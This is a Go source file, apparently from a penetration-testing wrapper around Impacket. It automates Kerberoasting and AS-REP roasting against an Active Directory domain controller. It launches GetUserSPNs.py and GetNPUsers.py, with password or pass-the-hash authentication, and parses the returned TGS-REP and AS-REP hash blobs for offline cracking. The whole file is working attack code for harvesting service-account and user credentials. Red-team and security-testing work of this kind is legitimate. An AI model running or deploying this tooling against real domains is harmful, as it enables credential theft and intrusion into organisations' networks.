// tools/impacket/kerberoast.go
package impacket

import (
	"context"
	"errors"
	"fmt"
	"regexp"
	"time"
)

// KerberosHash is a hash blob from Kerberoasting (TGS-REP) or AS-REP Roasting.
type KerberosHash struct {
	Username string
	Domain   string
	SPN      string // non-empty for TGS-REP (Kerberoasting); empty for AS-REP
	Hash     string // full $krb5tgs$... or $krb5asrep$... blob
}

// KerberoastConfig configures GetUserSPNs.py.
type KerberoastConfig struct {
	Target   string // DC IP or hostname
	Domain   string // required: target domain, e.g. "corp.local"
	Username string
	Password string
	Hash     string // pass-the-hash: LMHASH:NTHASH
}

// ASREPRoastConfig configures GetNPUsers.py.
// Requests hashes for all accounts that have pre-authentication disabled.
type ASREPRoastConfig struct {
	Target   string // DC IP or hostname
	Domain   string // required
	Username string // optional: single user; if empty requests all vulnerable accounts
	Password string
	Hash     string // pass-the-hash: LMHASH:NTHASH
}

// tgsHashRe matches GetUserSPNs -request output lines:
//
//	$krb5tgs$23$*username$DOMAIN.LOCAL$spn/host:port*$a1b2c3...
var tgsHashRe = regexp.MustCompile(`^\$krb5tgs\$\d+\$\*([^$]+)\$([^$]+)\$([^*]+)\*\$(.+)`)

// asrepHashRe matches GetNPUsers -request output lines:
//
//	$krb5asrep$23$username@DOMAIN.LOCAL:a1b2c3...
var asrepHashRe = regexp.MustCompile(`^\$krb5asrep\$\d+\$([^@]+)@([^:]+):(.+)`)

// Kerberoast runs GetUserSPNs.py -request and returns TGS-REP hashes for
// all service accounts with registered SPNs, crackable offline.
// Returns ErrNoHashesFound when the output contained no hash lines.
func (i *Impacket) Kerberoast(ctx context.Context, name string, cfg KerberoastConfig) ([]KerberosHash, error) {
	if cfg.Target == "" || cfg.Domain == "" {
		return nil, fmt.Errorf("kerberoast: Target and Domain are required")
	}
	args := append([]string{"-request", "-dc-ip", cfg.Target},
		authArgs(cfg.Domain, cfg.Username, cfg.Password, cfg.Hash, cfg.Domain)...)
	return i.collectKerberosHashes(ctx, name, "GetUserSPNs.py", args, parseTGSLine)
}

// ASREPRoast runs GetNPUsers.py -request and returns AS-REP hashes for
// accounts with Kerberos pre-authentication disabled, crackable offline.
func (i *Impacket) ASREPRoast(ctx context.Context, name string, cfg ASREPRoastConfig) ([]KerberosHash, error) {
	if cfg.Target == "" || cfg.Domain == "" {
		return nil, fmt.Errorf("asreproast: Target and Domain are required")
	}
	args := asrepArgs(cfg)
	return i.collectKerberosHashes(ctx, name, "GetNPUsers.py", args, parseASREPLine)
}

func asrepArgs(cfg ASREPRoastConfig) []string {
	args := []string{"-request", "-no-pass", "-dc-ip", cfg.Target}
	if cfg.Username != "" {
		args = append(args, authArgs(cfg.Domain, cfg.Username, cfg.Password, cfg.Hash, cfg.Domain)...)
	} else {
		// Query all accounts: just pass domain/
		args = append(args, cfg.Domain+"/")
	}
	return args
}

// collectKerberosHashes is the shared synchronous runner for Kerberoast variants.
func (i *Impacket) collectKerberosHashes(
	ctx context.Context,
	name, tool string,
	args []string,
	parse func(string) (KerberosHash, bool),
) ([]KerberosHash, error) {
	proc, err := i.mgr.Start(ctx, name, tool, args)
	if err != nil {
		return nil, err
	}

	done := make(chan []KerberosHash, 1)
	go func() {
		var hashes []KerberosHash
		for line := range proc.Lines() {
			if h, ok := parse(line); ok {
				hashes = append(hashes, h)
			}
		}
		done <- hashes
	}()

	select {
	case hashes := <-done:
		return hashes, errors.Join(proc.Wait())
	case <-ctx.Done():
		_ = i.mgr.Kill(name)
		select {
		case <-done:
		case <-time.After(5 * time.Second):
			return nil, errors.Join(ctx.Err(), fmt.Errorf("%s: process did not exit within 5s after kill", tool))
		}
		return nil, ctx.Err()
	}
}

func parseTGSLine(line string) (KerberosHash, bool) {
	m := tgsHashRe.FindStringSubmatch(line)
	if m == nil {
		return KerberosHash{}, false
	}
	return KerberosHash{
		Username: m[1],
		Domain:   m[2],
		SPN:      m[3],
		Hash:     line,
	}, true
}

func parseASREPLine(line string) (KerberosHash, bool) {
	m := asrepHashRe.FindStringSubmatch(line)
	if m == nil {
		return KerberosHash{}, false
	}
	return KerberosHash{
		Username: m[1],
		Domain:   m[2],
		Hash:     line,
	}, true
}
